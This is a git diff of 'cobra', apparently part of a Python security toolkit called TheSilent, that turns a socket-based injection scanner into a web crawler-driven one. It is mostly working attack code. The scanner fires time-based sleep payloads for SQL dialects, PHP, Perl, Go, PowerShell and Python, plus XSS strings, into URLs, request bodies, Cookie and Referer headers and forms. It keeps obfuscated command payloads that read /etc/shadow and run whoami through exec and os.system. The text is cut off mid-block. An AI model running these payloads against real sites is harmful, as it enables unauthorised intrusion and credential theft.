@@ -1,28 +1,23 @@
-import ipaddress
 import re
-import socket
 import time
+import urllib.parse
 from TheSilent.clear import clear
-from TheSilent.dolphin import dolphin
+from TheSilent.kitten_crawler import kitten_crawler
+from TheSilent.puppy_requests import text
 
+RED = "\033[1;31m"
 CYAN = "\033[1;36m"
 GREEN = "\033[0;32m"
-RED = "\033[1;31m"
 
 def cobra(host,delay=0):
     hits = []
 
-    emojis = ["\U0001F600",
-             "\U0001F47C",
-             "\U0001F525"]
+    mal_adobe_groovy = [r"sleep(60)"]
+
+    mal_apple_script = [r"delay 60"]
 
     mal_command = [r"sleep 60",
                    r"sleep \6\0"]
-
-    init_mal_command = mal_command[:]
-    for mal in init_mal_command:
-        for emoji in emojis:
-            mal_command.append(emoji + mal + emoji)
 
     mal_command_enumerate = [r"cat /etc/shadow",
                              r"cat \/\e\t\c/\s\h\ad\o\w",
@@ -32,11 +27,25 @@ def cobra(host,delay=0):
                              r"\p\w\d",
                              r"whoami",
                              r"\w\h\o\a\m\i"]
+    
+    mal_go_lang = [r'package main;import "time";func main(){time.Sleep(60*time.Second)}']
+    
+    mal_ms_sql = [r'WAITFOR DELAY "00:01"']
 
-    init_mal_command_enumerate = mal_command_enumerate[:]
-    for mal in init_mal_command_enumerate:
-        for emoji in emojis:
-            mal_command_enumerate.append(emoji + mal + emoji)
+    mal_my_sql = [r"SELECT SLEEP(60);"]
+
+    mal_oracle_sql = [r"DBMS_LOCK.sleep(60);",
+                  r"DBMS_SESSION.sleep(60);"]
+    
+    mal_perl = [r"sleep(60);"]
+
+    mal_php = [r"sleep(60);"]
+
+    mal_postgresql = [r"pg_sleep(60);",
+                      r"PERFORM pg_sleep(60);",
+                      r"SELECT pg_sleep(60);"]
+    
+    mal_powershell = [r"start-sleep -seconds 60"]
 
     mal_python = [r"time.sleep(60)",
                   r"eval(compile('import time\ntime.sleep(60)','cobra','exec'))",
@@ -49,11 +58,6 @@ def cobra(host,delay=0):
                   r'exec("__import__(\'os\').system(\'sleep 60\')")',
                   r'exec("import time\ntime.sleep(60)"',
                   r'exec("import os\nos.system(\'sleep 60\')")']
-
-    init_mal_python = mal_python[:]
-    for mal in init_mal_python:
-        for emoji in emojis:
-            mal_python.append(emoji + mal + emoji)
 
     mal_python_enumerate = [r"eval(compile('import os\nos.system('cat /etc/shadow')','cobra','exec'))",
                             r"eval(compile('import os\nos.system('cat \/\e\t\c/\s\h\ad\o\w')','cobra','exec'))",
@@ -95,124 +99,1497 @@ def cobra(host,delay=0):
                             r'exec("import os\nos.system(\'\p\w\d\')")',
                             r'exec("import os\nos.system(\'whoami\')")',
                             r'exec("import os\nos.system(\'\w\h\o\a\m\i\')")']
-
-    init_mal_python_enumerate = mal_python_enumerate[:]
-    for mal in init_mal_python_enumerate:
-        for emoji in emojis:
-            mal_python_enumerate.append(emoji + mal + emoji)
     
-    clear()
+    mal_ruby = [r"sleep(1.minutes)"]
     
-    # subnet
-    if re.search("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$",host):
-        subnet = list(ipaddress.ip_network(host,strict=False).hosts())
-        for ip in subnet:
-            ip = str(ip)
-            print(CYAN + f"port scanning {ip}")
-            time.sleep(delay)
-            ports = dolphin(ip)
-            for port in ports:
-                print(CYAN + f"checking: {ip}:{port}")
-                for mal in mal_command:
-                    time.sleep(delay)
-                    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    tcp_socket.settimeout(120)
-                    try:
-                        tcp_socket.connect((ip, port))
-                        tcp_socket.send(mal.encode())
-                        start = time.time()
-                        data = tcp_socket.recv(65535)
-                        end = time.time()
-                        if end - start >= 45:
-                            for mal_enum in mal_command_enumerate:
-                                time.sleep(delay)
-                                tcp_socket.send(mal_enum.encode())
-                                data = tcp_socket.recv(65535)
-                                tcp_socket.close()
-                                if len(data) > 0:
-                                    if not re.search("^HTTP/1\.[0-2]\s+4[0-9]{1,2}",data):
-                                        hits.append(f"command injection in {ip}:{port} (payload: {mal_enum})- {data}")
+    mal_xss = [r"<iframe>Cobra</iframe>",
+               r"<p>cobra</p>",
+               r"<script>alert('Cobra')</script>",
+               r"<script>await sleep(60);</script>",
+               r"<script>prompt('Cobra')</script>",
+               r"<strong>cobra</strong>",
+               r"<style>body{background-color:red;}</style>",
+               r"<title>cobra</title>"]
+    
+    hosts = kitten_crawler(host,delay)
 
-                        tcp_socket.close()
+    for _ in hosts:
+        print(CYAN + f"checking: {_}")
 
-                    except:
-                        pass
+        try:
+            forms = re.findall("<form.+form>",text(_).replace("\n",""))
 
-                for mal in mal_python:
-                    time.sleep(delay)
-                    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    tcp_socket.settimeout(120)
-                    try:
-                        tcp_socket.connect((ip, port))
-                        tcp_socket.send(mal.encode())
-                        start = time.time()
-                        data = tcp_socket.recv(65535)
-                        end = time.time()
-                        if end - start >= 45:
-                            for mal_enum in mal_python_enumerate:
-                                time.sleep(delay)
-                                tcp_socket.send(mal_enum.encode())
-                                data = tcp_socket.recv(65535)
-                                if len(data) > 0:
-                                    if not re.search("^HTTP/1\.[0-2]\s+4[0-9]{1,2}",data):
-                                        hits.append(f"emoji injection in {ip}:{port} (payload: {mal_enum})- {data}")
+        except:
+            forms = []
 
-                        tcp_socket.close()
-
-                    except:
-                        pass
-
-    # single host  
-    else:
-        print(CYAN + "port scanning")
-        ports = dolphin(host)
-        for port in ports:
-            print(CYAN + f"checking: {port}")
-            for mal in mal_command:
+        # check for adobe groovy injection
+        for mal in mal_adobe_groovy:
+            try:
                 time.sleep(delay)
-                tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                tcp_socket.settimeout(120)
-                try:
-                    tcp_socket.connect((host, port))
-                    tcp_socket.send(mal.encode())
-                    start = time.time()
-                    data = tcp_socket.recv(65535)
-                    end = time.time()
-                    if end - start >= 45:
-                        for mal_enum in mal_command_enumerate:
-                            time.sleep(delay)
-                            tcp_socket.send(mal_enum.encode())
-                            data = tcp_socket.recv(65535)
-                            tcp_socket.close()
-                            if len(data) > 0:
-                                if not re.search("^HTTP/1\.[0-2]\s+4[0-9]{1,2}",data):
-                                    hits.append(f"command injection in port {port}:{mal_enum}- {data}")
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"adobe groovy injection in url: {_}/{mal}")
 
-                    tcp_socket.close()
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"adobe groovy injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"adobe groovy injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"adobe groovy injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"adobe groovy injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"adobe groovy injection in forms: {_} | {field_dict}")
 
                 except:
                     pass
 
-            for mal in mal_python:
+        # check for apple script injection
+        for mal in mal_apple_script:
+            try:
                 time.sleep(delay)
-                tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                tcp_socket.settimeout(120)
-                try:
-                    tcp_socket.connect((host, port))
-                    tcp_socket.send(mal.encode())
-                    start = time.time()
-                    data = tcp_socket.recv(65535)
-                    end = time.time()
-                    if end - start >= 45:
-                        for mal_enum in mal_python_enumerate:
-                            time.sleep(delay)
-                            tcp_socket.send(mal_enum.encode())
-                            data = tcp_socket.recv(65535)
-                            if len(data) > 0:
-                                if not re.search("^HTTP/1\.[0-2]\s+4[0-9]{1,2}",data):
-                                    hits.append(f"python injection in port {port}:{mal_enum}- {data}")
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"apple script injection in url: {_}/{mal}")
 
-                    tcp_socket.close()
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"apple script injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"apple script injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"apple script injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"apple script injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"apple script injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for command injection
+        for mal in mal_command:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"command injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"command injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"command injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"command injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"command injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"command injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for go lang injection
+        for mal in mal_go_lang:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"go lang injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"go lang injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"go lang injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"go lang injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"go lang injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"go lang injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for ms sql injection
+        for mal in mal_ms_sql:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"ms sql injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"ms sql injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"ms sql injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"ms sql injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"ms sql injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"ms sql injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for my sql injection
+        for mal in mal_my_sql:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"my sql injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"my sql injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"my sql injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"my sql injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"my sql injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"my sql injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for oracle sql injection
+        for mal in mal_oracle_sql:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"oracle sql injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"oracle sql injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"oracle sql injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"oracle sql injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"oracle sql injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"oracle sql injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for perl injection
+        for mal in mal_perl:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"perl injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"perl injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"perl injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"perl injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"perl injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"perl injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for php injection
+        for mal in mal_php:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"php injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"php injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"php injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
